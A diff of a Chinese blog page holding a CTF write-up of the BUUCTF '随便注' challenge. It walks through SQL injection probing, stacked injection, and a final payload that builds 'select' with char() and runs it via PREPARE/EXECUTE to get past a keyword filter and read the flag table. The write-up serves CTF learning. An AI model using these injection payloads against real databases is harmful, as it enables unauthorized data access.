@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="随便注 1之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了 先随便点击一下提交 看得出是一个sql注入类型的题目 1234567输入1 没有报错1&amp;apos; 出现报错，验证存在注入1’# 没有报错1&amp;apos; order by 1# 没有报错1&amp;apos; order by 3# 出现报错，证明字段有2个1&amp;apos; union select 1,2#   retur">
+<meta name="description" content="随便注 1之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了 先随便点击一下提交 看得出是一个sql注入类型的题目 1234567输入1 没有报错1&amp;apos; 出现报错，验证存在注入1’# 没有报错1&amp;apos; order by 1# 没有报错1&amp;apos; order by 3# 出现报错，证明字段有2个1&amp;apos; union select 1,2#   return preg_match(&quot;&#x2F;selec">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF-随便注 1">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;18&#x2F;BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="随便注 1之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了 先随便点击一下提交 看得出是一个sql注入类型的题目 1234567输入1 没有报错1&amp;apos; 出现报错，验证存在注入1’# 没有报错1&amp;apos; order by 1# 没有报错1&amp;apos; order by 3# 出现报错，证明字段有2个1&amp;apos; union select 1,2#   retur">
+<meta property="og:description" content="随便注 1之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了 先随便点击一下提交 看得出是一个sql注入类型的题目 1234567输入1 没有报错1&amp;apos; 出现报错，验证存在注入1’# 没有报错1&amp;apos; order by 1# 没有报错1&amp;apos; order by 3# 出现报错，证明字段有2个1&amp;apos; union select 1,2#   return preg_match(&quot;&#x2F;selec">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;%E9%9A%8F%E4%BE%BF%E6%B3%A81&#x2F;0.png">
 <meta property="og:updated_time" content="2020-02-21T06:31:18.797Z">
@@ -390,20 +390,20 @@
         <h1 id="随便注-1"><a href="#随便注-1" class="headerlink" title="随便注 1"></a>随便注 1</h1><p>之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了</p>
 <p>先随便点击一下提交<br><img src="/images/BUUCTF/%E9%9A%8F%E4%BE%BF%E6%B3%A81/0.png" alt="avatar"></p>
 <p>看得出是一个sql注入类型的题目</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1 没有报错</span><br><span class="line">1&apos; 出现报错，验证存在注入</span><br><span class="line">1’# 没有报错</span><br><span class="line">1&apos; order by 1# 没有报错</span><br><span class="line">1&apos; order by 3# 出现报错，证明字段有2个</span><br><span class="line">1&apos; union select 1,2#   return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject); 过滤掉了很多关键字</span><br></pre></td></tr></table></figure>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">' 出现报错，验证存在注入</span></span><br><span class="line"><span class="string">1’# 没有报错</span></span><br><span class="line"><span class="string">1'</span> order by <span class="number">1</span><span class="comment"># 没有报错</span></span><br><span class="line"><span class="number">1</span><span class="string">' order by 3# 出现报错，证明字段有2个</span></span><br><span class="line"><span class="string">1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2<span class="comment">#   return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 过滤掉了很多关键字</span></span></span><br></pre></td></tr></table></figure>
 <p>当时就卡在这里，现在想想还是很亏没有考虑的很多，赛后看了大佬们的WP才知道思路：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show databases;# 成功，说明存在堆叠注入</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment"># 成功，说明存在堆叠注入</span></span><br></pre></td></tr></table></figure>
 <p>堆叠注入可以参考一下：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
 <p>我的理解下来，加上学完了数据库原理，大概意思就是;在数据库中代表一条语句的结束，系统识别到;时，前面的代码在系统中就被视为已经结束，所以可以利用;来进行堆叠注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;# 得到表名1919810931114514</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment"># 得到表名1919810931114514</span></span><br></pre></td></tr></table></figure>
 <p>这里用到了Mysql的预处理语句，可以参考这里：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
 <p>感觉有点像数据库安全那里，创建角色，然后把权限赋值给该角色，再通过该角色依次赋予权限，主要是为了省事。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE sqla FROM &apos;[my sql sequece]&apos;; 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 执行预定义sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> <span class="string">'[my sql sequece]'</span>; 预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行预定义<span class="keyword">sql</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
 <p>也可以通过变量传输</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET @tn=&apos;hahaha&apos;; 存储表名</span><br><span class="line">SET @sql=concat(&apos;select * from &apos;,@tn); 存储sql语句</span><br><span class="line">PREPARE sqla FROM @sql; 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 执行SQL预定义语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn=<span class="string">'hahaha'</span>; 存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'select * from '</span>,@tn); 存储sql语句</span><br><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> @<span class="keyword">sql</span>; 预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行SQL预定义语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>
 
 <p>构造payload<br>这里可以用char()方法将ASCII码转换为select字符串，再利用concat()拼接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&apos;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE sqla from @sql;EXECUTEsqla;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11';<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">" * from `1919810931114514`"</span>);<span class="keyword">PREPARE</span> sqla <span class="keyword">from</span> @<span class="keyword">sql</span>;EXECUTEsqla;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 
@@ -529,7 +529,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -540,7 +540,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
